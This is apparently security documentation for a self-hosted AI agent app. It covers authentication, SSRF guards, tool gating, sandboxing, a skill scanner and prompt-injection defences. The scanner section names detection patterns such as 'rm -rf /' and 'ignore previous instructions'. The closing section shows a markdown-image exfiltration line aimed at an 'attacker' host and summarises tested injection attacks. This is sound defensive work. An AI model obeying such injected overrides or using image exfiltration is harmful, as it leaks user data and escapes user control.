# Security

Pantheon is a single-user app that usually runs on localhost. The controls below exist because it holds API keys, runs agent tool calls, and fetches URLs chosen by the model. Everything listed here is implemented in code.

## Authentication (`backend/api/auth.py`, `main.py`)

- **Password:** `AUTH_PASSWORD`. If it is empty, auth is **off** and the DNS-rebinding guard below takes over. `password_matches()` (HMAC compare) is the only password check.
- **Sessions:** `POST /api/auth/login` issues a random 32-byte token. Only its SHA-256 is stored, in `data/db/auth_sessions.db`, and it expires after `AUTH_SESSION_DAYS` (30). Each session is tagged with a fingerprint of `AUTH_PASSWORD`+`SECRET_KEY`, so changing either one logs everything out.
- **Transport:** the `pantheon_session` cookie (`HttpOnly; SameSite=Strict`, `Secure` over HTTPS or `X-Forwarded-Proto: https`), or `Authorization: Bearer <token>` for scripts. **Tokens are never accepted in the query string.**
- **Password throttle:** 10 failures per client IP per 5 min, then 429. It covers `POST /api/auth/login` and every other password check (`POST /api/system/update/execute`). The client IP is `api.auth.client_ip`: the TCP peer, or, when the peer is in `TRUSTED_PROXIES`, the right-most `X-Forwarded-For` entry that isn't itself a trusted proxy.
- **CSRF:** requests other than GET/HEAD/OPTIONS with a foreign `Origin` get 403. Origins compare as **scheme + host + port** (`origin_is_allowed`): an Origin is allowed when it is listed in `CORS_ORIGINS` or equals the request's own origin (`request_origin`). Another service on the same hostname at another port (Nextcloud at `:8443`, Jellyfin at `:8096`, …) is a different origin.
- **Trusted proxy headers** (`TRUSTED_PROXIES`, IPs/CIDRs, default `127.0.0.1,::1`): only when the TCP peer is in that list are `X-Forwarded-For` (client IP), `X-Forwarded-Proto`, `X-Forwarded-Host` and `X-Forwarded-Port` (request origin) used. From any other peer the origin is the `Host` header with the URL scheme, and a `Host` without a port means the scheme's default port. A proxy that drops the port from `Host` (nginx `proxy_set_header Host $host`) therefore needs the public origin in `CORS_ORIGINS`, or `X-Forwarded-Port` plus `TRUSTED_PROXIES`. `ALLOWED_HOSTS` is only the DNS-rebinding list; it never allows an Origin.
- **CORS is the outermost middleware**, so preflight `OPTIONS` requests are answered without a session and 401/403/421 responses still carry CORS headers for listed origins.
- **WebSockets** skip the HTTP middleware, so every WS endpoint calls `authorize_websocket(ws)` before `accept()`. It checks the insecure-default lock, `Origin`, the host guard and the session.
- **Auth off:** requests whose `Host` is a public dotted name not listed in `ALLOWED_HOSTS` get 421. IP literals, `localhost` and `.local`/`.lan`/`.internal`/… names are allowed.
- **Public paths:** `/`, `/health`, `/api/health`, `/docs`, `/redoc`, `/openapi.json`, `/api/auth/{login,config,logout}`, `/api/mcp/oauth/callback` and `/api/mcp/oauth/client-metadata.json`. When the frontend is built, any path outside `/api/` and `/ws/` (the static UI shell) is public too.

## Insecure-default lockdown

`insecure_defaults()` flags `VAULT_MASTER_KEY`, `SECRET_KEY` or `AUTH_PASSWORD` when they still hold the `config.py` defaults or the `.env.example` placeholders. While any of them do, HTTP returns **503** and WebSockets are refused for every client that isn't loopback. A proxy's `X-Forwarded-For`, `X-Real-IP` or `Forwarded` header counts as remote. `ALLOW_INSECURE_DEFAULTS=true` overrides this.

To change the vault key, run `scripts/rotate_vault_key.py` with the backend stopped. It re-encrypts every secret in one transaction, refuses to run if any secret can't be decrypted, backs up `vault.db` and `.env`, then writes the new key.

## Secrets vault (`backend/secrets/vault.py`)

- Fernet encryption in `data/db/vault.db`.
- **KDF v2:** PBKDF2-SHA256 with 600k iterations over the full `VAULT_MASTER_KEY` and a random per-vault salt stored in `vault_meta`. Older v1 vaults (truncated key, fixed salt, 100k iterations) are re-encrypted on first open. If any secret can't be decrypted with the current key the migration is aborted (error logged, vault left v1 and unchanged) and retried on the next start.
- `GET /api/secrets` lists key names only, never values.
- **Secrets never follow user-set URLs by name.** A search provider may only reference `search_key__*` or `*_api_key` vault keys (`agent.search_providers.is_search_key_name`). LLM keys are excluded. This is checked on save and on use.

## Outbound fetches (SSRF)

- `utils.net.safe_http_get` resolves the host, blocks non-public addresses on **every redirect hop**, and connects to the IP it validated. The Host header and TLS SNI keep the real name, so DNS rebinding between check and connect doesn't work. Behind an HTTP(S) proxy it skips pinning. `ALLOW_PRIVATE_FETCH=true` opts out.
- **Size caps:** `safe_http_get` streams the body and raises `ResponseTooLargeError` past `max_bytes` (default `FETCH_MAX_MB`, 200). `download_file` passes `DOWNLOAD_MAX_MB` (50) and saves nothing when the file is bigger.
- **Browser tools** (`BROWSER_ENABLED=true`): `browser_tools._guard_route` runs on every Playwright request. It aborts any request to a non-public host and fetches navigations without following redirects. Tools re-check the page's final URL before returning content.

## Agent tool gating

- **Host exec:** `HOST_EXEC_TOOLS` = `run_command`, `code_execute`, `git_sync_repo`, `git_status`, `git_create_branch`, `git_merge`, `git_commit`, `git_push_pr` and `start_autoresearch` (it queues a job that runs a benchmark command on the host). These tools are hidden and refused unless `AgentCore(host_exec=True)`. `AGENT_HOST_EXEC` controls this:
  - `interactive` (default): web chat, and coding tasks started from it.
  - `always`: every context.
  - `never`: no context.
  Autonomous jobs, scheduled runs, iteration loops and messaging bots are background contexts.
- **Task review:** `create_task(skip_review=true)` is honoured only in interactive web chat. Tasks created from jobs or bots always land as proposals that need approval. Coding tasks (`create_task(job_type="coding_task")`, `start_coding_task`) run with host exec and have no proposal state, so they can only be started from the web chat; from jobs or bots they are refused.
- **Job creation:** `POST /api/jobs` accepts only `autonomous_task`, `iteration_loop` and `coding_task`.
- **GitHub writes:** `github(action="merge_pr")` and `delete_branch` run only in interactive chat, like `push_artifacts`. `create_branch`, `write_files` and `create_pr` stay available to jobs, because `iteration_loop` and `coding_task` (plans the user approved) commit through them. Messaging-app turns (`ToolContext.channel` = telegram, slack, ...) get no repo writes at all: the bot relays chat-app users, not the web UI's signed-in user.
- **Reruns:** `rerun_job` only sees the current project's jobs, and refuses `coding_task` / `autoresearch` jobs (they run host commands) outside interactive chat, the same rule as starting them.
- **Git tools need a checkout.** `git_status`, `git_create_branch`, `git_merge`, `git_commit` and `git_push_pr` refuse to run until `git_sync_repo` has cloned the bound repo; `_run_git_cmd` never runs `git init` (it used to initialise the workspace root, which `git_commit` + `git_push_pr` then pushed whole). Branch names given to the git tools must pass git's ref-name rules, so a `-`-prefixed name can't become an option.
- **Git credentials** are never put in URLs. `_git_auth_env(token)` sets `http.extraheader` through `GIT_CONFIG_*` environment variables.

## Code sandbox (`backend/sandbox/`)

`code_execute` and `run_command` run through `sandbox.get_sandbox()`. It is **not** used by skills (there is no skill executor), by the `git_*` tools, which call git directly, or by the autoresearch benchmark, which runs as a plain shell subprocess in the project workspace (`utils/autoresearch.py`).

| `PANTHEON_SANDBOX` | Backend | Isolation |
|---|---|---|
| `subprocess` (default) | `SubprocessSandbox` | **None beyond limits.** Runs through `ulimit -d` (data segment; Linux ≥ 4.7 counts anonymous mmaps too — `-v` made V8/node abort at start). The environment is filtered to `PATH HOME USER LANG LC_ALL PYTHONPATH NODE_PATH TERM`. Output is capped at 1 MB. Timeouts kill the whole process group. |
| `firecracker` | `FirecrackerSandbox` | A fresh microVM per run (Linux+KVM; set up with `scripts/setup_firecracker.sh`; `FIRECRACKER_DIR`/`FC_DIR`). No jailer. If init fails it falls back to subprocess and logs an error. |

Limits:

- `code_execute`: 30s default (max 300), 256 MB. The script name (`filename`) is reduced to a bare `[A-Za-z0-9._-]` basename (`sandbox.backend.safe_script_filename`); anything else gets the language's default name.
- `run_command`: 120s default (max 1800), 4 GB. It runs in the project's repo checkout or workspace, and `workdir` may not escape it.
- With Firecracker, `run_command`'s working directory (the repo checkout) is packed into a second ext4 disk (`mkfs.ext4 -d`), mounted at `/workspace` in the VM, and mirrored back afterwards (`debugfs rdump`). The mirror deletes only files that existed before the run, and never recreates a guest symlink that is absolute or resolves outside the workspace (nor writes through a host path that does); skipped paths are reported in stderr. The VM has no network, so package installs fail there. `FC_MEM_MIB` (default 1024), `FC_VCPUS` and `FC_WORKSPACE_HEADROOM_MB` tune it.

`GET /api/system/sandbox` reports the backend's health.

## Builds (`backend/builder/`)

`run_build` never compiles inside Pantheon. With `PANTHEON_BUILDER=kubernetes` each build is a pod in `BUILDER_NAMESPACE`: no service-account token, non-root, every capability dropped, read-only root filesystem, CPU/memory/disk limits, source delivered in ConfigMaps. A build is refused unless a NetworkPolicy in the namespace denies all egress (`BUILDER_ALLOW_NETWORK=true` overrides). Pantheon's own pod needs a service-account token for this, and anything running in that pod - including `run_command` - can use it, so `deploy/kubernetes/builder.yaml` locks the namespace down independently of the pods Pantheon creates: the `restricted` Pod Security Standard is enforced, every pod is denied network, a ResourceQuota caps usage, and the Role (pods, pods/log, configmaps, networkpolicies `list`) cannot change any of that. See [builds.md](builds.md). `GET /api/system/builder` reports its status.

## Paths and rendering

- **Untrusted names become paths only through `utils.paths`:** `is_within`, `check_project_id` (raises `InvalidProjectId`, returned as 400) and `safe_filename`. Document conversion formats go through `document_converter.validate_format`.
- **Folder walks don't follow symlinks out.** Recursive workspace walks that copy or export files (`batch_convert_documents`, `/api/files/download-zip`, `/api/files/to-artifacts`, `/api/files/batch-convert`) use `utils.paths.iter_files_within`, which skips symlinks and anything resolving outside the workspace — not `rglob`.
- **GitHub API URLs** are built only by `integrations.github.repo_path`: owner/repo must match GitHub's name rules (`validate_owner`, `validate_repo_name`), branch/ref names git's ref rules (`validate_ref_name`), and repo file paths are quoted per segment with `.`/`..` refused (`quote_repo_file_path`). `GitHubClient._request` also refuses any path with a dot segment (even percent-encoded) and pagination URLs off `api.github.com`. The repo binding (`POST /api/projects/{id}/repo`) validates owner/repo/default branch (400), and `_repo_checkout_dir` checks them again before building `repos/<owner>__<repo>` (and before `git_sync_repo(fresh=true)` deletes it).
- **Artifacts by id are project-scoped:** `read_artifact`, `update_artifact`, `delete_artifact`, `index(target="artifact", id=…)` and `generate_image(source_image=…)` answer "not found in this project" for another project's id.
- **Legacy `uploads/…png` references** in chat messages are inlined only when they resolve inside the workspace's `uploads/`.
- **Workspace HTML** renders in `SandboxedHtml`: `srcDoc` with `sandbox="allow-scripts"`, no same-origin. Any HTML set via `innerHTML` goes through DOMPurify; Mermaid SVG relies on mermaid's `securityLevel: 'strict'` instead.

## Project import / export

- **No VCS control dirs.** Export skips `.git`, `.hg`, `.svn`, `.bzr`, `_darcs` and `.jj` directories and symlinks. Import never restores a path with such a component (a `.git/config` or hook would run on the next git command, e.g. `core.fsmonitor`), and never restores `workspace/repos/` (repo checkouts are re-cloned by `git_sync_repo`).
- **Zip-bomb guard** (`check_archive_limits`, also when the scan is skipped): at most 10,000 members, 100 MB per member, 2 GB uncompressed in total, a compression ratio of at most 200:1 for members over 1 MB, and no absolute, drive-letter or `..` member paths. Checked from the central directory before anything is decompressed.
- **projects.json** is written only through `utils/jsonfile.py`: one process-wide lock per file for every read-modify-write, an atomic replace (temp file + `os.replace`) and the previous good copy in `projects.json.bak`. A file that doesn't parse is an error (HTTP 500), never replaced by a default.

## Messaging bots

Allowlists are deny-by-default. An empty `telegram_allowed_chat_ids`, `slack_allowed_channel_ids`, `discord_allowed_guild_ids`, `matrix_allowed_room_ids` or `mattermost_allowed_channel_ids` means nobody gets a reply. Every adapter re-reads its allowlist for each message (and each Telegram button press), so edits apply without a restart. Bots are a background context and are gated further (`agent.tools.BOT_BLOCKED_TOOLS`, `is_bot_channel`): a messaging-app turn never gets host exec (not even with `AGENT_HOST_EXEC=always`), and `delete_artifact`, `rerun_job`, `create_skill`, `merge_topics` changes (only `list`) and every GitHub repo write are hidden from the model and refused by `execute_tool`. The bot relays chat-app users, who are allowlisted but are not the web UI's signed-in user. See [messaging.md](messaging.md).

## MCP OAuth

MCP servers can use OAuth 2.1: discovery through Protected Resource Metadata and the authorization server's metadata (tried in the 2026-07-28 order, and refused when its `issuer` is not the one asked for), PKCE S256 with a `resource` indicator, and a client id obtained in the spec's priority order (`MCPManager._resolve_oauth_client`): credentials the user **pre-registered** on the connection (the id in the config, the secret in the vault as `mcp_oauth_prereg_secret__<name>`; bound to the issuer they were first used with, and refused for any other), else Pantheon's **Client ID Metadata Document** when the server advertises `client_id_metadata_document_supported`, else **Dynamic Client Registration**, else an error naming the redirect URI to register by hand. Pending `state` expires after 10 min. Tokens are stored in the vault as `mcp_oauth_tokens__<name>`, plus `mcp_oauth_client_secret__<name>` when a dynamically registered client got a secret; revoking tokens keeps the registration, removing the connection forgets all three.

The metadata document is served, without authentication, at `/api/mcp/oauth/client-metadata.json` and names itself as `client_id`, so it is published only when that URL is a valid client id an internet-facing authorization server could fetch: HTTPS, a path, no userinfo or fragment, and a public host - never localhost, a private address, or a tailnet / `.local` name (`oauth.cimd_client_id`, from `PUBLIC_BASE_URL` or the browser origin; `MCP_CLIENT_ID_METADATA_URL` overrides it, `MCP_CIMD_ENABLED=false` turns it off). The document declares a public client (`token_endpoint_auth_method: none`, PKCE) with exactly our callback URI, so it can never carry a secret. If an authorization server bounces a CIMD authorization (`invalid_client`, `unauthorized_client`, `invalid_request`, `access_denied` on the callback), that issuer is marked and the next Authorize registers dynamically instead.

The authorization response is checked against the issuer the flow started with (RFC 9207): a redirect whose `iss` names another authorization server is refused, and so is one without `iss` when the server's metadata said it sends one. Registered client ids are bound to that issuer; when a server's Protected Resource Metadata starts pointing at a different authorization server, the stored tokens are dropped and Pantheon registers afresh instead of presenting the old client id there.

## MCP protocol revisions

The client speaks the stateless `2026-07-28` revision and the `2025-11-25` handshake. It never sends a session id to a modern server, mirrors the method and tool name into the `Mcp-Method` / `Mcp-Name` headers, and mirrors only the tool parameters the server annotated with `x-mcp-header` into `Mcp-Param-*` headers, after validating the annotations and dropping any tool whose annotations break the rules. Tool `inputSchema` `$ref`s that point at the network are never fetched.

**Elicitation** (`mcp_client/elicitation.py`): the `elicitation` capability (`form` + `url`) is declared only on requests a person can answer - `server/discover`, `tools/list`, and a `tools/call` made from the web chat. Calls from bots, jobs and the REST API omit it, so a conforming server must not ask; one that asks anyway gets no answer and the model is told. What the server asked is validated before it is shown: only `elicitation/create` (never sampling or roots), URL mode only with an `http(s)` URL, form mode only with a flat object schema. The UI shows the connection name and tool, the full URL and its host (with a warning for punycode or non-HTTPS), never prefetches the URL and opens it only on a click, in a new tab with no opener or referrer. Form answers are validated against the schema (types, required, enum, bounds, formats) in the browser and again on the server side of the WebSocket, unknown fields are dropped, and `requestState` is echoed byte for byte and never inspected. The model never sees form values - only the action and the field names - and the answers travel to the MCP server only. A server may re-ask up to 8 rounds per call; an unanswered card is cancelled after `MCP_ELICITATION_TIMEOUT_SECONDS` (600) or when the socket closes.

**Tasks** (`mcp_client/tasks.py`): the tasks extension is declared on every modern request, so any server may answer `tools/call` with a task handle; the client polls it to the end inside the same tool call (the agent turn waits) and never trusts the handle beyond that call - task ids are not persisted, `tasks/get` replies are validated (`taskId` must match, terminal states must carry their `result` / `error`), and the client stops with `tasks/cancel` when the user cancels, when the socket closes, when `createdAt` + `ttlMs` passes, when `MCP_TASK_MAX_WAIT_SECONDS` (1800) is exceeded, or when the task asks for input nobody can give. Task-side `inputRequests` get the elicitation treatment above (same trust model, keys deduplicated across polls). `statusMessage` is shown to the user capped at 500 characters and is never fed to the model.

The `redirect_uri` is `PUBLIC_BASE_URL` + `/api/mcp/oauth/callback` when set; otherwise the request that starts the flow decides: its `Origin` if that passes the origin check, else its own origin (above), else `http://localhost:8000`. It is stored with the pending state, so the code exchange sends the same value.

Connection listings and `GET /api/mcp/debug/{name}` mask secrets: every custom header value is `***`, and URLs lose their userinfo and every query-string value (`?tavilyApiKey=***`). A masked URL sent back on update gets its real values restored (`restore_masked_url`).

Refreshes are serialized per connection (`_REFRESH_LOCKS`). If the authorization server rejects a refresh, the connection shows `needs_auth`. The callback is a public path; its protection is the PKCE verifier plus `state`.

## Skill scanner and gates

Imported skill bundles can contain arbitrary files, so `skills/scanner.py` scans them in three layers:

1. **Static checks.** Extension allow- and blocklists, size caps (10 MB total, 500 KB per file, 50 files), and regex checks for `os.system`, `shell=True`, `eval`/`exec`, hardcoded credentials and `rm -rf /` (all critical), plus warnings for network, env, obfuscation and deletion patterns. Markdown and text files (`.md`, `.txt`) are checked for prompt-injection phrasing: "ignore previous instructions", bypassing guards and sending credentials are critical; hiding actions from the user is a warning (`INSTRUCTION_PATTERNS`).
2. **Capability analysis.** Compares declared capabilities with what the code appears to do.
3. **AI review** (optional). An LLM (the `extract` class) looks for malicious intent in scripts and for prompt injection in the instructions, including markdown-only skills.

Findings are weighted 0.02 (info), 0.10 (warning) and 0.35 (critical). A scan fails on any critical finding or a score of 0.5 or more.

- **Import** always scans. A failed import, or a failed `POST /api/skills/{name}/scan`, moves the skill to `data/skills/.quarantine/`. Bundled skills are flagged, never moved.
- **Enable gate:** enabling a non-bundled skill that has no scan or a failed scan returns 403. A failed skill is `scan_blocked`: it is never offered to the agent, `/slug` ignores it, and scheduled runs fail.
- **Scan cache:** results are cached with a content hash, so any file edit invalidates the scan.
- **Scan at load:** any non-bundled skill without a valid scan — new, edited in the editor, or written by hand — gets layers 1–2 when the registry loads (`SkillRegistry._static_scan`, no LLM call), so nothing reaches the prompt unscanned. The `create_skill` agent tool also runs the full scan (with AI review), because the model wrote that text.
- **Override:** `PUT /api/skills/{name}/toggle` with `force_enable: true` and an `override_password` that matches vault `skill_security_override_password`. The comparison is constant-time and every attempt against a configured password is logged.
- **Anti-spoofing:** `is_bundled` is set by the loader, never read from `skill.json`. A user skill can't shadow a bundled name, and unquarantine returns 409 on a collision.

## Audit log (`backend/security_log.py`)

Events are written as JSON lines to `<data_dir>/logs/security.log` and also appear on the console. Read or clear the log with `GET` or `DELETE /api/settings/security-log`. Emitted events:

- **Auth:** `auth.login_success`, `auth.login_failure` (bad password, rate limit, bad WS origin or token).
- **Skills:** `skill.scan_passed`, `skill.scan_failed`, `skill.scan_all`, `skill.enabled`, `skill.disabled`, `skill.override_used`, `skill.override_failed`, `skill.quarantined`, `skill.unquarantined`, `skill.deleted`, `skill.name_collision_blocked`.
- **Vault and settings:** `vault.secret_set`, `vault.secret_deleted`, `settings.updated` (key names only).

## Not enforced

- Skill `permissions.network_domains`, `file_paths`, `vault_secrets` and `memory_tiers` are declared only. The scanner reads them; nothing enforces them at runtime.
- The subprocess sandbox is not isolation. Use Firecracker, or `AGENT_HOST_EXEC=never`, if that matters.

## Prompt injection through web content

Web pages, search results, browser and MCP tool output can contain instructions aimed at AI assistants. Two layers:

- **Fenced as data.** Results of those tools reach the model inside `<untrusted_content>` with a note that they are data, not instructions. Chat-template control tokens (`<|im_start|>`, `[INST]` and similar) are defused first, because a local model server may tokenise them as real turn markers.
- **Other content written by someone else is fenced too:** results of `read_file` (workspace files include downloads and clones), `read_artifact` (artifacts include ingested web pages and documents), `github` (third-party repo files, issues, PRs), and `run_command` / `code_execute` / `run_build` output. Recalled memory from ingested material (document and file chunks, facts extracted from artifacts, graph entries) is fenced the same way inside the turn's `<context>` block, and every recalled item is capped at 1500 characters.
- **Pasted links are fenced too.** Links in your message are opened before the agent starts (`AGENT_PREFETCH_URLS`), through the same `web_fetch` tool and the same fencing; the step is labelled as reading only, so the page is not treated as a task. Measured: 0/36 attacks succeeded from pre-fetched pages, and no unrequested writes in 60 runs.
- **No remote images in replies.** The chat UI renders markdown images, so an injected `![x](https://attacker/p.png?d=…)` would make the browser send data with zero clicks. Replies show such images as text ("image not shown … external image from host") unless your own message contained the URL. This covers every markdown image form (inline, `<angle bracket>` destinations, nested brackets in the alt text, reference-style `![x][r]` with the `[r]: url` definition anywhere in the reply, `data:` and `//host` URLs, entity/backslash-escaped schemes) and HTML `<img>`, while streaming as well as in the saved reply. As a second layer the chat view loads only same-origin images and shows any other image as a link. Images you link yourself are therefore shown as a link in the chat view too.

Measured with fixture attack pages (overrides, fake system blocks, silent memory poisoning, data-exfiltration fetches and images, hidden endorsements, malicious install commands): held-out attacks that succeeded went from 4/18 to 0/18, and the user's actual request was handled 18/18 instead of 14/18.

